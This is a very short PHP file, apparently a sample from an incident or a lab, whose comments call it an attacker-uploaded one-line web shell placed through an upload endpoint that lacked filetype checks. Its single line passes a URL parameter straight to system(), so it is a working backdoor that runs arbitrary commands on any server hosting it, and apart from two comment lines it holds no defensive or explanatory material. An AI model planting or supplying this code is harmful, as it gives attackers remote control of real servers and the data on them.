<?php
// Attacker-uploaded webshell — classic "one-liner" backdoor.
// The uploads endpoint accepted a .php file without filetype validation.
system($_GET['cmd']);
?>
